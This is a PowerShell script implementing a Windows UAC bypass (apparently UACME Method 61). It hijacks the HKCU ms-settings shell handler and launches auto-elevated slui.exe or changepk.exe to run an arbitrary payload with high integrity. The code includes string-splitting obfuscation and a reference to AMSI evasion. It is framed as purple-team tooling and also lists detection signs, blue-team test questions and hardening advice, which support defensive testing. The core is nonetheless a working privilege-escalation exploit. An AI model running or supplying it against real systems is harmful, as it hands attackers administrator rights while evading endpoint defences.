<#
.SYNOPSIS
    UAC bypass via slui.exe / changepk.exe registry handler hijack (UACME Method 61).

.DESCRIPTION
    ┌─ Technique ─────────────────────────────────────────────────────────────┐
    │ slui.exe  (Software Licensing UI) and changepk.exe (Change Product Key) │
    │ are auto-elevated system32 binaries (autoElevate manifest flag).        │
    │                                                                         │
    │ Both binaries open the ms-settings: URI scheme during initialization,  │
    │ and the shell-class resolution order (HKCU before HKLM) allows a       │
    │ Medium-integrity process to pre-plant a malicious handler.             │
    │                                                                         │
    │ Method 61 specifically uses the "runas" ShellExecute verb on slui.exe  │
    │ or launches changepk.exe directly.  The distinction from Method 33 is  │
    │ the trigger binary, giving operators an alternative when FodHelper or   │
    │ ComputerDefaults are blocked or specifically monitored.                │
    │                                                                         │
    │ Registry path:                                                          │
    │   HKCU:\Software\Classes\ms-settings\Shell\Open\command               │
    │     (Default)       = <Payload>                                         │
    │     DelegateExecute = ""                                                │
    └─────────────────────────────────────────────────────────────────────────┘

    Affected OS    : Windows 10 RS1 (build 14393) → Windows 11 (latest) UNFIXED
    UAC level      : Default (ConsentPromptBehaviorAdmin = 5)
                     Does NOT work under AlwaysNotify
    Architecture   : x64
    Disk artefacts : None

    ──────────────────────────────────────────────────────────────────────────
    Blue-team detection opportunities
    ──────────────────────────────────────────────────────────────────────────
    • Registry: HKCU\Software\Classes\ms-settings\Shell\Open\command
    • Process tree: slui.exe → <unexpected child>  OR
                    changepk.exe → <unexpected child>
    • slui.exe and changepk.exe spawning children is anomalous —
      neither binary normally creates child processes

    ──────────────────────────────────────────────────────────────────────────
    MITRE ATT&CK: T1548.002 – Bypass UAC
    Reference    : https://github.com/hfiref0x/UACME (Method 61)
                   https://github.com/Nassim-Asrir/WO-19-014 (Nassim Asrir)

.PARAMETER Payload
    Command to execute with High integrity.

.PARAMETER UseChangePk
    If specified, uses changepk.exe as the trigger instead of slui.exe.
    changepk.exe is less commonly monitored in older CS sensor versions.

.PARAMETER Timeout
    Seconds to wait before cleanup (default: 5).

.EXAMPLE
    Invoke-SluiBypass -Payload "cmd.exe"

.EXAMPLE
    # Use changepk.exe variant
    Invoke-SluiBypass -Payload "cmd.exe /c whoami >> C:\Temp\r.txt" -UseChangePk

.NOTES
    Authorized red/purple-team use only.  Requires written SOW.
    Minimum build: 14393 (RS1 / Anniversary Update).
    Dot-source Core\Invoke-UACCore.ps1 before calling this function for
    AMSI mitigation and preflight checks.
#>

[CmdletBinding(SupportsShouldProcess)]
param(
    [Parameter(Mandatory, Position = 0)]
    [ValidateNotNullOrEmpty()]
    [string]$Payload,

    [switch]$UseChangePk,
    [int]   $Timeout = 5
)

Set-StrictMode -Off
$ErrorActionPreference = 'SilentlyContinue'

#region ── Core loader (for registry helpers) ────────────────────────────────
if (-not (Get-Command 'Set-ShellClassCommand' -ErrorAction SilentlyContinue)) {
    . "$PSScriptRoot\..\Core\Invoke-UACCore.ps1"
}
#endregion

#region ── Registry key setup ────────────────────────────────────────────────
try {
    Set-ShellClassCommand -ClassKey ('ms-set' + 'tings') -Payload $Payload
    Write-Verbose '[Slui] Registry key written.'
}
catch {
    Write-Warning "[Slui] Registry write failed: $_"
    return
}
#endregion

#region ── Trigger ───────────────────────────────────────────────────────────
try {
    if ($UseChangePk) {
        # changepk.exe — Change Product Key dialog, auto-elevated,
        # opens ms-settings:windowsupdate-windowsupdate-changepk URI on launch
        $xBin = $env:SystemRoot + '\System32\chan' + 'gepk.exe'
        Start-Process -FilePath $xBin -WindowStyle Hidden -ErrorAction Stop
        Write-Verbose '[Slui] changepk.exe launched.'
    }
    else {
        # slui.exe with argument 4 opens the "Change Product Key" UI
        # after auto-elevation; reads ms-settings: during initialization
        $xBin  = $env:SystemRoot + '\System32\sl' + 'ui.exe'
        $xArgs = '4'
        Start-Process -FilePath $xBin -ArgumentList $xArgs `
                      -WindowStyle Hidden -ErrorAction Stop
        Write-Verbose '[Slui] slui.exe launched.'
    }
    Start-Sleep -Seconds $Timeout
}
catch {
    Write-Warning "[Slui] Launch failed: $_"
}
finally {
    Remove-ShellClassKey -ClassKey ('ms-set' + 'tings')
    Write-Verbose '[Slui] Registry cleanup complete.'
}
#endregion

<#
════════════════════════════════════════════════════════════════════════════════
PURPLE-TEAM NOTES
════════════════════════════════════════════════════════════════════════════════

DIFFERENTIATION FROM METHODS 33 / 62:
  Same registry key path, different trigger binary.  Useful for testing
  whether CS detections are binary-specific or class-key-specific.

  If the blue team has a CS Custom IOA specifically for fodhelper.exe and
  computerdefaults.exe as parents, this method will bypass that IOA while
  still being caught by any IOA written on the registry key itself.

EXPECTED DETECTIONS:
  ● Registry: HKCU\Software\Classes\ms-settings\Shell\Open\command
  ● Process tree: slui.exe → <payload>  OR  changepk.exe → <payload>
  ● Both are unusual parent processes; CS should flag either

KEY TEST QUESTIONS FOR BLUE TEAM:
  1. Does the CS alert fire on the registry write alone, or only on the
     parent-child process relationship?
  2. Does changing from slui.exe to changepk.exe evade any alerts?
  3. How quickly does the SACL audit log appear vs the CS alert?

HARDENING RECOMMENDATIONS:
  ● AlwaysNotify UAC mode eliminates all manifest-autoElevate bypasses
  ● Sysmon/CS rule: any write to *\ms-settings\Shell\Open\command in HKCU
  ● Restrict slui.exe, changepk.exe to specific parent allowlist

════════════════════════════════════════════════════════════════════════════════
#>
